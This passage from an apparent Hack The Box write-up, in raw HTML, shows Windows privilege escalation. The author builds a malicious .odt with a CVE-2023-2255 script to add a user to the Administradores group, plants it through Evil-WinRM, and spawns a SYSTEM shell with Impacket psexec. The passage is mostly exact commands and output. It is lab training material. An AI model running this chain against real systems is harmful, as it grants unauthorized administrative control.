</span></span></span><span class=line><span class=cl><span class=go>Comment                      Cuenta integrada para la administraci¬¢n del equipo o dominio
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               No
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            2024-06-03 6:20:06 AM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             Never
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          2024-06-03 6:20:06 AM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships      *Administradores
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Ninguno
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>I create a new payload in my machine that will add the user <code>gunzf0x</code> to group <code>Administradores</code> (or <code>Administrators</code> in english):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE-2023-2255.py --cmd &#39;net localgroup Administradores gunzf0x /add&#39; --output &#39;privuser.odt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>File privuser.odt has been created !
</span></span></span></code></pre></div><p>Upload it to the victim machine and copy it to <code>Important Documents</code> directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; upload privuser.odt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; cmd.exe /c copy C:\Users\maya\Documents\privuser.odt &#39;C:\Important Documents\privuser.odt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        1 file(s) copied.
</span></span></span></code></pre></div><p>And after some seconds, if I check the groups of my created user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; net user gunzf0x
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User name                    gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>Full Name
</span></span></span><span class=line><span class=cl><span class=go>Comment
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               Yes
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            2024-06-03 6:35:44 AM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             2024-07-15 6:35:44 AM
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          2024-06-03 6:35:44 AM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships      *Administradores      *Usuarios
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Ninguno
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>it is a user from <code>Administradores</code> (or <code>Administrators</code> ) group.</p><p>I check if we have access via <code>SMB</code> with this new added user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.14 -u &#39;gunzf0x&#39; -p &#39;gunzf0x123$&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.14     445    MAILING          [+] MAILING\gunzf0x:gunzf0x123$ (Pwn3d!)
</span></span></span></code></pre></div><p>Since we do, I will use <code>psexec.py</code> along with <code>rlwrap</code> to obtain a shell as <code>nt/authority system</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr python3 /usr/share/doc/python3-impacket/examples/psexec.py gunzf0x:&#39;gunzf0x123$&#39;@mailing.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Requesting shares on mailing.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Found writable share ADMIN$
</span></span></span><span class=line><span class=cl><span class=go>[*] Uploading file CCgKtget.exe
</span></span></span><span class=line><span class=cl><span class=go>[*] Opening SVCManager on mailing.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Creating service puII on mailing.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Starting service puII.....
</span></span></span><span class=line><span class=cl><span class=go>[!] Press help for extra shell commands
</span></span></span><span class=line><span class=cl><span class=go>[-] Decoding error detected, consider running chcp.com at the target,
</span></span></span><span class=line><span class=cl><span class=go>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
</span></span></span><span class=line><span class=cl><span class=go>and then execute smbexec.py again with -codec and the corresponding codec
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [VersiÔøΩn 10.0.19045.4355]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>(c) Microsoft Corporation. Todos los derechos reservados.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nt authority\system
</span></span></span></code></pre></div><p>and that&rsquo;s it. We can read the flag at <code>localadmin</code> user.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>